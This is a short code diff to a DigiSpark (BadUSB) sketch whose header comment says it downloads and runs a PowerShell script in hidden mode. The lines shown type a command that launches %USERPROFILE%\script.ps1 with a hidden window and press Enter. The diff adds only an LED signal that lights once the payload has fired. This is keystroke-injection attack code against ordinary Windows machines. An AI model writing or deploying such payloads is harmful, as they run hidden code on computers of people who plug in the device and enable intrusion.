@@ -1,6 +1,7 @@
 //This DigiSpark scripts downloads and executes a powershell script in hidden mode.
 #include "DigiKeyboard.h"
 void setup() {
+	pinMode(1, OUTPUT);
 }
 
 void loop() {
@@ -29,6 +30,7 @@ void loop() {
   //DigiKeyboard.delay(750);
   DigiKeyboard.print("powershell.exe -windowstyle hidden -File %USERPROFILE%\\script.ps1");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  digitalWrite(1, HIGH);
   for (;;) {
     /*empty*/
   }
